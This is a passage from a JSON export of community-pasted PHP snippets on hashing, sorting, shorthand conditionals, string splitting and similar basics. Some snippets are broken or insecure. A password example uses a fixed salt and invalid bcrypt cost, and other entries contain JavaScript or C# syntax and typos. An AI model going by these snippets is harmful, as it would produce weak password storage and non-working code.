    "description": "$a = \"N&atilde;o\";    echo utf8_encode($a);   \nutf8_encode ( string $data )\n<?php $mysqli = new mysqli(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  if ($mysqli -> connect_errno) {   echo \"Failed to connect to MySQL: \" . $mysqli -> connect_error;   exit(); }  echo \"Initial character set is: \" . $mysqli -> character_set_name();  // Change character set to utf8 $mysqli -> set_charset(\"utf8\");  echo \"Current character set is: \" . $mysqli -> character_set_name();  $mysqli -> close(); ?>\n",
    "reg_date": "2021-10-12T10:19:19.000Z"
  },
  {
    "id": 4186,
    "keyword": null,
    "link": null,
    "title": " php set x-frame-options",
    "description": "header(\"X-Frame-Options: SAMEORIGIN\");  //Akbarali saqlagan\n",
    "reg_date": "2021-10-12T10:19:19.000Z"
  },
  {
    "id": 4187,
    "keyword": null,
    "link": null,
    "title": " php setter getter",
    "description": "class MyClass {     private $firstField;     private $secondField;      public function getFirstField() {         return $this->firstField;     }     public function setFirstField($x) {         $this->firstField = $x;     }     public function getSecondField() {         return $this->secondField;     }     public function setSecondField($x) {         $this->secondField = $x;     } } \n",
    "reg_date": "2021-10-12T10:19:19.000Z"
  },
  {
    "id": 4188,
    "keyword": null,
    "link": null,
    "title": " php sha256",
    "description": "echo hash('sha256', $_POST['ppasscode']);\n$hash = hash('sha256', 'hello, world!'); var_dump($hash); \necho hash('sha256', 'some string');\n$password = 'test123';  /* \tAlways use salt for security reasons.     I'm using the BCRYPT algorithm use any valid one you like. */ $options['salt'] = 'usesomesillystringforsalt'; $options['cost'] = 3; echo password_hash($password, PASSWORD_BCRYPT, $options)\n <?php echo hash('ripemd160', 'The quick brown fox jumped over the lazy dog.'); ?>  \nhash($hashingMethod, $dataToBeHashed, $BinaryOutputMode = false)    some hashingMethod options:  md5 sha1 sha256 sha384 sha512\n",
    "reg_date": "2021-10-12T10:19:20.000Z"
  },
  {
    "id": 4189,
    "keyword": null,
    "link": null,
    "title": " php sha256 example",
    "description": "echo hash('sha256', $_POST['ppasscode']);\nCould this be a typo? (two Ps in ppasscode, intended?)  $_POST['ppasscode']; I would make sure and do:  print_r($_POST); and make sure the data is accurate there, and then echo out what it should look like:  echo hash('sha256', $_POST['ppasscode']); Compare this output to what you have in the database (manually). By doing this you're exploring your possible points of failure:  Getting password from form hashing the password stored password comparison of the two.\nhash($hashingMethod, $dataToBeHashed, $BinaryOutputMode = false)    some hashingMethod options:  md5 sha1 sha256 sha384 sha512\n",
    "reg_date": "2021-10-12T10:19:20.000Z"
  },
  {
    "id": 4190,
    "keyword": null,
    "link": null,
    "title": " php shell script",
    "description": "<?php $output = shell_exec('cat /etc/hosts'); echo \"<pre>$output</pre>\"; ?>\n",
    "reg_date": "2021-10-12T10:19:20.000Z"
  },
  {
    "id": 4191,
    "keyword": null,
    "link": null,
    "title": " php short if",
    "description": "<?php $v = 1;  $r = (1 == $v) ? 'Yes' : 'No'; // $r is set to 'Yes' $r = (3 == $v) ? 'Yes' : 'No'; // $r is set to 'No'  echo (1 == $v) ? 'Yes' : 'No'; // 'Yes' will be printed  // and since PHP 5.3 $v = 'My Value'; $r = ($v) ?: 'No Value'; // $r is set to 'My Value' because $v is evaluated to TRUE  $v = ''; echo ($v) ?: 'No Value'; // 'No Value' will be printed because $v is evaluated to FALSE ?> \n$errors = array(             0 => 'OK',             1 => 'Неверный xml',             2 => 'Широта не указана',             3 => 'Долгота не указана',             4 => 'Дата и время запроса не указаны',             5 => 'Точность не указана',             6 => 'Идентификатор телефона не указан',             7 => 'Идентификатор телефона не найден',             8 => 'Неверная широта',             9 => 'Неверная долгота',             10 => 'Неверная точность',             11 => 'Заказы не найдены',             12 => 'Неверные дата и время запроса',             13 => 'Ошибка mysql',             14 => 'Неизвестная функция',             15 => 'Тариф не найден',             18 => 'Город отправления не указан',             19 => 'Город назначения не указан',             20 => 'Неверная масса',             21 => 'Город отправления не найден',             22 => 'Город назначения не найден',             23 => 'Масса не указана',             24 => 'Логин не указан',             25 => 'Ошибка авторизации',             26 => 'Логин уже существует',             27 => 'Клиент уже существует',             28 => 'Адрес не указан',             29 => 'Более не поддерживается',             30 => 'Настройка sip не выполнена',             31 => 'Телефон не указан',             32 => 'Телефон курьера не указан',             33 => 'Ошибка соединения',             34 => 'Неверный номер',             35 => 'Неверный номер',             36 => 'Ошибка определения тарифа',             37 => 'Ошибка определения тарифа',             38 => 'Тариф не найден',             39 => 'Тариф не найден',         );          return isset($errors[$code]) ? $errors[$code] : 'Неизвестная ошибка';\n$is_admin = ($user['permissions'] == 'admin') ? true : false;\n<?php echo ($qte > 0) ? $qte : 0; ?>\n",
    "reg_date": "2021-10-12T10:19:20.000Z"
  },
  {
    "id": 4192,
    "keyword": null,
    "link": null,
    "title": " php shorthand if",
    "description": "<?php $v = 1;  $r = (1 == $v) ? 'Yes' : 'No'; // $r is set to 'Yes' $r = (3 == $v) ? 'Yes' : 'No'; // $r is set to 'No'  echo (1 == $v) ? 'Yes' : 'No'; // 'Yes' will be printed  // and since PHP 5.3 $v = 'My Value'; $r = ($v) ?: 'No Value'; // $r is set to 'My Value' because $v is evaluated to TRUE  $v = ''; echo ($v) ?: 'No Value'; // 'No Value' will be printed because $v is evaluated to FALSE ?> \n$is_admin = ($user['permissions'] == 'admin') ? true : false;\n$y = $x ? \"true\" : \"false\";\n<?php echo ($qte > 0) ? $qte : 0; ?>\n",
    "reg_date": "2021-10-12T10:19:20.000Z"
  },
  {
    "id": 4193,
    "keyword": null,
    "link": null,
    "title": " php shorthand if isset",
    "description": "$var = $var ?? \"default\";\n$name = isset($_POST['submit']) ? $_POST['name'] : null; \n",
    "reg_date": "2021-10-12T10:19:20.000Z"
  },
  {
    "id": 4194,
    "keyword": null,
    "link": null,
    "title": " php shorthand if isset post",
    "description": "$var = $var ?? \"default\";\n$name = isset($_POST['submit']) ? $_POST['name'] : null; \n",
    "reg_date": "2021-10-12T10:19:20.000Z"
  },
  {
    "id": 4195,
    "keyword": null,
    "link": null,
    "title": " php show error",
    "description": "// Add these lines somewhere on top of your PHP file: ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n//PHP functions ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  //.htaccess php_flag display_startup_errors on php_flag display_errors on php_flag html_errors on php_flag log_errors on php_value error_log  /home/path/public_html/domain/PHP_errors.log\nerror_reporting(E_ALL); ini_set('display_errors', 1);\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); //OR ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);\n",
    "reg_date": "2021-10-12T10:19:20.000Z"
  },
  {
    "id": 4196,
    "keyword": null,
    "link": null,
    "title": " php shuffle array",
    "description": "<?php $i_arr = [\"html\", \"css\", \"javascript\", \"php\", \"vue\", \"react\"];  echo \"<pre>\"; print_r($i_arr); echo \"</pre>\";  shuffle($i_arr);  echo \"<pre>\"; print_r($i_arr); echo \"</pre>\"; ?>\nshuffle($myAry); \n",
    "reg_date": "2021-10-12T10:19:20.000Z"
  },
  {
    "id": 4197,
    "keyword": null,
    "link": null,
    "title": " php shutdown function",
    "description": "register_shutdown_function(function () {   # code });\n",
    "reg_date": "2021-10-12T10:19:20.000Z"
  },
  {
    "id": 4198,
    "keyword": null,
    "link": null,
    "title": " php sigmoid function",
    "description": "function sigmoid($t){     return 1 / (1 + exp(-$t)); }\nfunction functionName() {     //code to be executed; }\n",
    "reg_date": "2021-10-12T10:19:21.000Z"
  },
  {
    "id": 4199,
    "keyword": null,
    "link": null,
    "title": " php skip loop",
    "description": "for ($i=0; $i <= 12; $i++) {   if($1 == 5){   \tcontinue;   }   //code block      //code block ends }\n   <?php  for ($x = 0; $x < 10; $x++) {   if ($x == 4) {        continue;   }   echo \"The number is: $x <br>\"; } ?> \n",
    "reg_date": "2021-10-12T10:19:21.000Z"
  },
  {
    "id": 4200,
    "keyword": null,
    "link": null,
    "title": " php sleep half a second",
    "description": "usleep(500000);\n",
    "reg_date": "2021-10-12T10:19:21.000Z"
  },
  {
    "id": 4201,
    "keyword": null,
    "link": null,
    "title": " php sleep milliseconds",
    "description": "usleep(500000);\nusleep(10);\t// Sleeps 1 millisecond\n <?php  // Current time echo date('h:i:s') . \"\\n\";  // wait for 2 seconds usleep(2000000);  // back! echo date('h:i:s') . \"\\n\";  ?>  \n",
    "reg_date": "2021-10-12T10:19:21.000Z"
  },
  {
    "id": 4202,
    "keyword": null,
    "link": null,
    "title": " php soap client sebd multiple requests",
    "description": " php soap client send multiple requests\n",
    "reg_date": "2021-10-12T10:19:21.000Z"
  },
  {
    "id": 4203,
    "keyword": null,
    "link": null,
    "title": " php socket connect",
    "description": " $res = socket_connect($socket, $addr, $port);\nhere are noobs instructions  go to your php installation directory in windows it can be something like this c:\\xampp\\php  the goto ext direction in it php\\ext\\  check if your have php_sockets.dll in that directory after that open php.ini file which will be in your php folder next search for ;extension=php_sockets.dll if you find it then remove ; from it  if you not find it then search for extension=  and then below some extension add extension=php_sockets.dll  and finally restart your apache.\n",
    "reg_date": "2021-10-12T10:19:21.000Z"
  },
  {
    "id": 4204,
    "keyword": null,
    "link": null,
    "title": " php sort array by key",
    "description": "$inventory = array(     array(\"type\"=>\"fruit\", \"price\"=>3.50),    array(\"type\"=>\"milk\", \"price\"=>2.90),    array(\"type\"=>\"pork\", \"price\"=>5.43),  ); $price = array_column($inventory, 'price'); array_multisort($price, SORT_DESC, $inventory);\n  $weight = [     'Pete' => 75,      'Benjamin' => 89,     'Jonathan' => 101   ];  \t   ksort($weight);\n$weight = [     'Pete' => 75,     'Benjamin' => 309,     'Jonathan' => 101 ]; asort($weight); /* weight is now: Array (     [Pete] => 75     [Jonathan] => 101     [Benjamin] => 309 ) To sort descending instead use: arsort */\n usort($array, function ($a, $b) {   return ($a['specific_key'] < $b['specific_key']) ? -1 : 1; }); \n$inventory = [ \t['price' => 10.99, 'product' => 'foo 1'],     ['price' => 5.99, 'product' => 'foo 2'],   \t['price' => 100, 'product' => 'foo 3'],    ];  $price = array_column($inventory, 'price');  array_multisort($price, SORT_DESC, $inventory);\nTo PHP sort array by key, you should use:  \tksort() (for ascending order) or krsort() (for descending order).         To PHP sort array by value, you will need functions: \tasort() and arsort() (for ascending and descending orders).\n",
    "reg_date": "2021-10-12T10:19:21.000Z"
  },
  {
    "id": 4205,
    "keyword": null,
    "link": null,
    "title": " php sort array by object value",
    "description": "/**  * A generic PHP sorting algorithm that uses `usort` and `strcmp`.  * `usort` &mdash; Sort an array by values using a user-defined comparison function.  * `strcmp` &mdash; Returns < 0 if param 1 is less than param 2; > 0 if param 1 is greater than param 2, and 0 if they are equal.  */ $questions = [   { id: 1, ordinal: 55 },   { id: 2, ordinal: 67 },   { id: 3, ordinal: 32 }, ];  function sortByOrdinal($param1, $param2) {     return strcmp($param1->ordinal, $param2->ordinal); }  /* `usort` alters an existing array. */ usort($questions, \"sortByOrdinal\");  /**  * $questions = [  *   { id: 3, ordinal: 32 },  *   { id: 1, ordinal: 55 },  *   { id: 2, ordinal: 67 },  * ];  */\n<?php class Person {     var $first_name;     var $last_name;      function __construct( $fn, $ln ) {         $this->first_name = $fn;         $this->last_name = $ln;     }      public function get_first_name() {         return $this->first_name;     }      public function get_last_name() {         return $this->last_name;     } }  $rob = new Person( 'Rob', 'Casabona' ); $joe = new Person( 'Joe', 'Casabona' ); $erin = new Person( 'Erin', 'Casabona' ); $steve = new Person( 'Steve', 'Wozniack' ); $bill = new Person( 'Bill', 'Gates' ); $walt = new Person( 'Walt', 'Disney' ); $bob = new Person( 'Bob', 'Iger' );  $people = array( $rob, $joe, $erin, $steve, $bill, $walt, $bob );  //The sorting usort($people, function($a, $b){     return [$a->get_last_name(), $a->get_first_name()] <=> [$b->get_last_name(), $b->get_first_name()];    });  ?>  <pre>     <?php print_r($people);?> </pre>\n",
    "reg_date": "2021-10-12T10:19:21.000Z"
  },
  {
    "id": 4206,
    "keyword": null,
    "link": null,
    "title": " php sort array by specific key",
    "description": "$inventory = array(     array(\"type\"=>\"fruit\", \"price\"=>3.50),    array(\"type\"=>\"milk\", \"price\"=>2.90),    array(\"type\"=>\"pork\", \"price\"=>5.43),  ); $price = array_column($inventory, 'price'); array_multisort($price, SORT_DESC, $inventory);\n  $weight = [     'Pete' => 75,      'Benjamin' => 89,     'Jonathan' => 101   ];  \t   ksort($weight);\n$weight = [     'Pete' => 75,     'Benjamin' => 309,     'Jonathan' => 101 ]; asort($weight); /* weight is now: Array (     [Pete] => 75     [Jonathan] => 101     [Benjamin] => 309 ) To sort descending instead use: arsort */\n usort($array, function ($a, $b) {   return ($a['specific_key'] < $b['specific_key']) ? -1 : 1; }); \n$inventory = [ \t['price' => 10.99, 'product' => 'foo 1'],     ['price' => 5.99, 'product' => 'foo 2'],   \t['price' => 100, 'product' => 'foo 3'],    ];  $price = array_column($inventory, 'price');  array_multisort($price, SORT_DESC, $inventory);\nTo PHP sort array by key, you should use:  \tksort() (for ascending order) or krsort() (for descending order).         To PHP sort array by value, you will need functions: \tasort() and arsort() (for ascending and descending orders).\n",
    "reg_date": "2021-10-12T10:19:21.000Z"
  },
  {
    "id": 4207,
    "keyword": null,
    "link": null,
    "title": " php sort array by subarray value",
    "description": "function sortByAge($a, $b) {      return $a['age'] > $b['age'];  }  $people=[      [\"age\"=>54,\"first_name\"=>\"Bob\",\"last_name\"=>\"Dillion\"],      [\"age\"=>22,\"first_name\"=>\"Sarah\",\"last_name\"=>\"Harvard\"],      [\"age\"=>31,\"first_name\"=>\"Chuck\",\"last_name\"=>\"Bartowski\"]  ];    usort($people, 'sortByAge'); //$people is now sorted by age (ascending)\n",
    "reg_date": "2021-10-12T10:19:21.000Z"
  },
  {
    "id": 4208,
    "keyword": null,
    "link": null,
    "title": " php sort array by value",
    "description": "  $weight = [     'Pete' => 75,      'Benjamin' => 89,     'Jonathan' => 101   ];  \t   ksort($weight);\n<?php $fruit = array(\"apple\",\"banana\",\"mango\",\"orange\",\"strawbary\");  sort($fruit);       //arrange in ascending order echo \"<pre>\"; print_r($fruit);  rsort( $fruit);     //sort in descending order foreach($fruit as $val) {     echo $val.\"<br>\"; }  $girl = array(\"krisha\"=>20,\"yashvi\"=>30,\"ritu\"=>4,\"pinal\"=>80); asort($girl);       //sort in ascending order according to value print_r($girl);  ksort($girl);   //sort in ascending order according to key print_r($girl);       arsort($girl);      //sort in descending order according to value print_r($girl);  krsort($girl);      //sort in descending order according to key print_r($girl); ?>\n//php 7+ usort($inventory, function ($item1, $item2) {     return $item1['price'] <=> $item2['price']; });\n$array = array(); $sorted_array = $array; asort($sorted_array);\n$price = array(); foreach ($inventory as $key => $row) {     $price[$key] = $row['price']; } array_multisort($price, SORT_DESC, $inventory);\n<?php $fruits = array(\"d\" => \"lemon\", \"a\" => \"orange\", \"b\" => \"banana\", \"c\" => \"apple\"); asort($fruits); foreach ($fruits as $key => $val) {     echo \"$key = $val\\n\"; } ?> //Would output: c = apple b = banana d = lemon a = orange  \n",
    "reg_date": "2021-10-12T10:19:22.000Z"
  },
  {
    "id": 4209,
    "keyword": null,
    "link": null,
    "title": " php sort array by value and keep key",
    "description": "$inventory = array(     array(\"type\"=>\"fruit\", \"price\"=>3.50),    array(\"type\"=>\"milk\", \"price\"=>2.90),    array(\"type\"=>\"pork\", \"price\"=>5.43),  ); $price = array_column($inventory, 'price'); array_multisort($price, SORT_DESC, $inventory);\n  $weight = [     'Pete' => 75,      'Benjamin' => 89,     'Jonathan' => 101   ];  \t   ksort($weight);\n$weight = [     'Pete' => 75,     'Benjamin' => 309,     'Jonathan' => 101 ]; asort($weight); /* weight is now: Array (     [Pete] => 75     [Jonathan] => 101     [Benjamin] => 309 ) To sort descending instead use: arsort */\n$inventory = [ \t['price' => 10.99, 'product' => 'foo 1'],     ['price' => 5.99, 'product' => 'foo 2'],   \t['price' => 100, 'product' => 'foo 3'],    ];  $price = array_column($inventory, 'price');  array_multisort($price, SORT_DESC, $inventory);\n//Sort an array in reverse order and maintain index association arsort($myArray) \n    function cmp($a, $b)     {         return strcmp($a->display_name, $b->display_name);     }      usort($blogusers, \"cmp\");      foreach ($blogusers as $bloguser)     {         ...\n",
    "reg_date": "2021-10-12T10:19:22.000Z"
  },
  {
    "id": 4210,
    "keyword": null,
    "link": null,
    "title": " php sort array by value length",
    "description": "function sortByLength($a,$b){     return strlen($b)-strlen($a); } usort($array,'sortByLength');\n",
    "reg_date": "2021-10-12T10:19:22.000Z"
  },
  {
    "id": 4211,
    "keyword": null,
    "link": null,
    "title": " php sort array of array by key",
    "description": "$inventory = array(     array(\"type\"=>\"fruit\", \"price\"=>3.50),    array(\"type\"=>\"milk\", \"price\"=>2.90),    array(\"type\"=>\"pork\", \"price\"=>5.43),  ); $price = array_column($inventory, 'price'); array_multisort($price, SORT_DESC, $inventory);\n  $weight = [     'Pete' => 75,      'Benjamin' => 89,     'Jonathan' => 101   ];  \t   ksort($weight);\n$inventory = [ \t['price' => 10.99, 'product' => 'foo 1'],     ['price' => 5.99, 'product' => 'foo 2'],   \t['price' => 100, 'product' => 'foo 3'],    ];  $price = array_column($inventory, 'price');  array_multisort($price, SORT_DESC, $inventory);\n",
    "reg_date": "2021-10-12T10:19:22.000Z"
  },
  {
    "id": 4212,
    "keyword": null,
    "link": null,
    "title": " php sort by associative array value",
    "description": "//php 7+ usort($inventory, function ($item1, $item2) {     return $item1['price'] <=> $item2['price']; });\n$price = array(); foreach ($inventory as $key => $row) {     $price[$key] = $row['price']; } array_multisort($price, SORT_DESC, $inventory);\n$inventory = [ \t['price' => 10.99, 'product' => 'foo 1'],     ['price' => 5.99, 'product' => 'foo 2'],   \t['price' => 100, 'product' => 'foo 3'],    ];  $price = array_column($inventory, 'price');  array_multisort($price, SORT_DESC, $inventory);\n// take an array with some elements $array = array('a','z','c','b'); // get the size of array $count = count($array); echo \"<pre>\"; // Print array elements before sorting print_r($array); for ($i = 0; $i < $count; $i++) {     for ($j = $i + 1; $j < $count; $j++) {         if ($array[$i] > $array[$j]) {             $temp = $array[$i];             $array[$i] = $array[$j];             $array[$j] = $temp;         }     } } echo \"Sorted Array:\" . \"<br/>\"; print_r($array); \n",
    "reg_date": "2021-10-12T10:19:22.000Z"
  },
  {
    "id": 4213,
    "keyword": null,
    "link": null,
    "title": " php sort file names by date",
    "description": "<?php // get current directory path $dirpath = getcwd(); // set file pattern $dirpath .= \"\\*.jpg\"; // copy filenames to array $files = array(); $files = glob($dirpath);  // sort files by last modified date usort($files, function($x, $y) {     return filemtime($x) < filemtime($y); });  foreach($files as $item){     echo basename($item) . \" => Last Modified On \" . @date('F d, Y, H:i:s', filemtime($item)) . \"<br/>\"; } ?>\n",
    "reg_date": "2021-10-12T10:19:22.000Z"
  },
  {
    "id": 4214,
    "keyword": null,
    "link": null,
    "title": " php sort hight to low",
    "description": "<?php $fruits = array(\"d\" => \"lemon\", \"a\" => \"orange\", \"b\" => \"banana\", \"c\" => \"apple\"); asort($fruits); foreach ($fruits as $key => $val) {     echo \"$key = $val\\n\"; } ?> //Would output: c = apple b = banana d = lemon a = orange  \n$letters=array(\"b\",\"a\",\"c\"); arsort($letters); //referse sort an array (\"c\",\"a\",\"b\")\n// array sort php $room_details = array(       \"2020-09-27\": [                 {                     \"content\": \"how are you\",                     \"detail_id\": \"1\",                     \"time\": \"17:57:28\",                     \"chat_time\": \"2020-09-24 17:57:28\",                     \"width\": \"0\",                     \"height\": \"0\",                     \"type\": \"1\",                     \"distance_time\": \"26 days ago\",                     \"avatar\": \"uploads/MemberImage/20200922-1436-image-5f699b536f438-0.png\",                     \"position\": 2                 },                 {                     \"content\": \"I am fine, thanks\",                     \"detail_id\": \"2\",                     \"time\": \"17:57:45\",                     \"chat_time\": \"2020-09-24 17:57:45\",                     \"width\": \"0\",                     \"height\": \"0\",                     \"type\": \"1\",                     \"distance_time\": \"26 days ago\",                     \"avatar\": \"uploads/MemberImage/20200922-1436-image-5f699b536f438-0.png\",                     \"position\": 2                 },       ], \t \"2020-09-24\": [                 {                     \"content\": \"how are you\",                     \"detail_id\": \"1\",                     \"time\": \"17:57:28\",                     \"chat_time\": \"2020-09-24 17:57:28\",                     \"width\": \"0\",                     \"height\": \"0\",                     \"type\": \"1\",                     \"distance_time\": \"26 days ago\",                     \"avatar\": \"uploads/MemberImage/20200922-1436-image-5f699b536f438-0.png\",                     \"position\": 2                 },                 {                     \"content\": \"I am fine, thanks\",                     \"detail_id\": \"2\",                     \"time\": \"17:57:45\",                     \"chat_time\": \"2020-09-24 17:57:45\",                     \"width\": \"0\",                     \"height\": \"0\",                     \"type\": \"1\",                     \"distance_time\": \"26 days ago\",                     \"avatar\": \"uploads/MemberImage/20200922-1436-image-5f699b536f438-0.png\",                     \"position\": 2                 },       ], );  sort($room_details);  // result // array sort php $room_details = array(       \"2020-09-24\": [                 ...       ], \t \"2020-09-27\": [                ...       ], ); \n",
    "reg_date": "2021-10-12T10:19:22.000Z"
  },
  {
    "id": 4215,
    "keyword": null,
    "link": null,
    "title": " php sort multidimensional array",
    "description": "function sortByAge($a, $b) {      return $a['age'] > $b['age'];  }  $people=[      [\"age\"=>54,\"first_name\"=>\"Bob\",\"last_name\"=>\"Dillion\"],      [\"age\"=>22,\"first_name\"=>\"Sarah\",\"last_name\"=>\"Harvard\"],      [\"age\"=>31,\"first_name\"=>\"Chuck\",\"last_name\"=>\"Bartowski\"]  ];    usort($people, 'sortByAge'); //$people is now sorted by age (ascending)\narray_multisort(array_map(function($element) {       return $element['order'];   }, $array), SORT_ASC, $array);  print_r($array);\n\t\t$keys = array_column($array, 'Price');  \t\tarray_multisort($keys, SORT_ASC, $array); \t \t\tprint_r($array);\n$inventory = array(    array(\"type\"=>\"Fruit\", \"price\"=>3.50),    array(\"type\"=>\"milk\", \"price\"=>2.90),    array(\"type\"=>\"Pork\", \"price\"=>5.43), );  $prices = array_column($inventory, 'price'); $inventory_prices = array_multisort($prices, SORT_DESC, $inventory);  $types = array_map(strtolower, array_column($inventory, 'type')); $inventory_types = array_multisort($types, SORT_ASC, $inventory);\n",
    "reg_date": "2021-10-12T10:19:22.000Z"
  },
  {
    "id": 4216,
    "keyword": null,
    "link": null,
    "title": " php sort multidimensional array by value",
    "description": "function sortByAge($a, $b) {      return $a['age'] > $b['age'];  }  $people=[      [\"age\"=>54,\"first_name\"=>\"Bob\",\"last_name\"=>\"Dillion\"],      [\"age\"=>22,\"first_name\"=>\"Sarah\",\"last_name\"=>\"Harvard\"],      [\"age\"=>31,\"first_name\"=>\"Chuck\",\"last_name\"=>\"Bartowski\"]  ];    usort($people, 'sortByAge'); //$people is now sorted by age (ascending)\narray_multisort(array_map(function($element) {       return $element['order'];   }, $array), SORT_ASC, $array);  print_r($array);\n\t\t$keys = array_column($array, 'Price');  \t\tarray_multisort($keys, SORT_ASC, $array); \t \t\tprint_r($array);\n$inventory = array(    array(\"type\"=>\"Fruit\", \"price\"=>3.50),    array(\"type\"=>\"milk\", \"price\"=>2.90),    array(\"type\"=>\"Pork\", \"price\"=>5.43), );  $prices = array_column($inventory, 'price'); $inventory_prices = array_multisort($prices, SORT_DESC, $inventory);  $types = array_map(strtolower, array_column($inventory, 'type')); $inventory_types = array_multisort($types, SORT_ASC, $inventory);\nfunction sortByOrder($a, $b) {     return $a['order'] - $b['order']; }  usort($myArray, 'sortByOrder');\nusort($myArray, function($a, $b) {     return $a['order'] <=> $b['order']; });\n",
    "reg_date": "2021-10-12T10:19:22.000Z"
  },
  {
    "id": 4217,
    "keyword": null,
    "link": null,
    "title": " php sort reverse",
    "description": " <?php $fruits = array(\"lemon\", \"orange\", \"banana\", \"apple\"); rsort($fruits); foreach ($fruits as $key => $val) {     echo \"$key = $val\\n\"; } ?>  \nfunction aasort (&$array, $key) {     $sorter=array();     $ret=array();     reset($array);     foreach ($array as $ii => $va) {         $sorter[$ii]=$va[$key];     }     asort($sorter);     foreach ($sorter as $ii => $va) {         $ret[$ii]=$array[$ii];     }     $array=$ret; }  aasort($your_array,\"order\"); \n <?php  $fruits = array(\"lemon\", \"orange\", \"banana\", \"apple\"); sort($fruits); foreach ($fruits as $key => $val) {     echo $val; } /* OUTPUT: apple banana lemon orange */ ?>  \n// Fonction de comparaison function cmp($a, $b) {     if ($a == $b) {         return 0;     }     return ($a < $b) ? -1 : 1; } \n// array sort php $room_details = array(       \"2020-09-27\": [                 {                     \"content\": \"how are you\",                     \"detail_id\": \"1\",                     \"time\": \"17:57:28\",                     \"chat_time\": \"2020-09-24 17:57:28\",                     \"width\": \"0\",                     \"height\": \"0\",                     \"type\": \"1\",                     \"distance_time\": \"26 days ago\",                     \"avatar\": \"uploads/MemberImage/20200922-1436-image-5f699b536f438-0.png\",                     \"position\": 2                 },                 {                     \"content\": \"I am fine, thanks\",                     \"detail_id\": \"2\",                     \"time\": \"17:57:45\",                     \"chat_time\": \"2020-09-24 17:57:45\",                     \"width\": \"0\",                     \"height\": \"0\",                     \"type\": \"1\",                     \"distance_time\": \"26 days ago\",                     \"avatar\": \"uploads/MemberImage/20200922-1436-image-5f699b536f438-0.png\",                     \"position\": 2                 },       ], \t \"2020-09-24\": [                 {                     \"content\": \"how are you\",                     \"detail_id\": \"1\",                     \"time\": \"17:57:28\",                     \"chat_time\": \"2020-09-24 17:57:28\",                     \"width\": \"0\",                     \"height\": \"0\",                     \"type\": \"1\",                     \"distance_time\": \"26 days ago\",                     \"avatar\": \"uploads/MemberImage/20200922-1436-image-5f699b536f438-0.png\",                     \"position\": 2                 },                 {                     \"content\": \"I am fine, thanks\",                     \"detail_id\": \"2\",                     \"time\": \"17:57:45\",                     \"chat_time\": \"2020-09-24 17:57:45\",                     \"width\": \"0\",                     \"height\": \"0\",                     \"type\": \"1\",                     \"distance_time\": \"26 days ago\",                     \"avatar\": \"uploads/MemberImage/20200922-1436-image-5f699b536f438-0.png\",                     \"position\": 2                 },       ], );  sort($room_details);  // result // array sort php $room_details = array(       \"2020-09-24\": [                 ...       ], \t \"2020-09-27\": [                ...       ], ); \n",
    "reg_date": "2021-10-12T10:19:23.000Z"
  },
  {
    "id": 4218,
    "keyword": null,
    "link": null,
    "title": " php sorting functions",
    "description": "<?php $fruit = array(\"apple\",\"banana\",\"mango\",\"orange\",\"strawbary\");  sort($fruit);       //arrange in ascending order echo \"<pre>\"; print_r($fruit);  rsort( $fruit);     //sort in descending order foreach($fruit as $val) {     echo $val.\"<br>\"; }  $girl = array(\"krisha\"=>20,\"yashvi\"=>30,\"ritu\"=>4,\"pinal\"=>80); asort($girl);       //sort in ascending order according to value print_r($girl);  ksort($girl);   //sort in ascending order according to key print_r($girl);       arsort($girl);      //sort in descending order according to value print_r($girl);  krsort($girl);      //sort in descending order according to key print_r($girl); ?>\n$price = array(); foreach ($inventory as $key => $row) {     $price[$key] = $row['price']; } array_multisort($price, SORT_DESC, $inventory);\n<?php $fruits = array(\"d\" => \"lemon\", \"a\" => \"orange\", \"b\" => \"banana\", \"c\" => \"apple\"); asort($fruits); foreach ($fruits as $key => $val) {     echo \"$key = $val\\n\"; } ?> //Would output: c = apple b = banana d = lemon a = orange  \n// take an array with some elements $array = array('a','z','c','b'); // get the size of array $count = count($array); echo \"<pre>\"; // Print array elements before sorting print_r($array); for ($i = 0; $i < $count; $i++) {     for ($j = $i + 1; $j < $count; $j++) {         if ($array[$i] > $array[$j]) {             $temp = $array[$i];             $array[$i] = $array[$j];             $array[$j] = $temp;         }     } } echo \"Sorted Array:\" . \"<br/>\"; print_r($array); \n",
    "reg_date": "2021-10-12T10:19:23.000Z"
  },
  {
    "id": 4219,
    "keyword": null,
    "link": null,
    "title": " php splat operator",
    "description": "foo(...$args);\n",
    "reg_date": "2021-10-12T10:19:23.000Z"
  },
  {
    "id": 4220,
    "keyword": null,
    "link": null,
    "title": " php split string",
    "description": "// Example 1 $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2\n<?php // It doesnt get any better than this Example $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2\n$colors  = \"red,blue,green,orange\"; $colorsArray = explode(\",\", $colors);\nstring phrase = \"The quick brown    fox     jumps over the lazy dog.\"; string[] words = phrase.Split(' ');  foreach (var word in words) {     System.Console.WriteLine($\"<{word}>\"); } \n// split() function was DEPRECATED in PHP 5.3.0, and REMOVED in PHP 7.0.0. // ALTERNATIVES: explode(), preg_split()  // explode() // DESCRIPTION: Breaks a string into an array. // explode ( string $separator , string $string , int $limit = PHP_INT_MAX ) : array $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2  // preg_split() // DESCRIPTION: Split the given string by a regular expression. // preg_split ( string $pattern , string $subject , int $limit = -1 , int $flags = 0 ) : array|false $keywords = preg_split(\"/[\\s,]+/\", \"hypertext language, programming\"); print_r($keywords); // output: Array (     [0] => hypertext     [1] => language     [2] => programming )\nexplode(\" \",\"Geeks for Geeks\")\n",
    "reg_date": "2021-10-12T10:19:23.000Z"
  },
  {
    "id": 4221,
    "keyword": null,
    "link": null,
    "title": " php split string along spaces",
    "description": "// Example 1 $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2\n",
    "reg_date": "2021-10-12T10:19:23.000Z"
  },
  {
    "id": 4222,
    "keyword": null,
    "link": null,
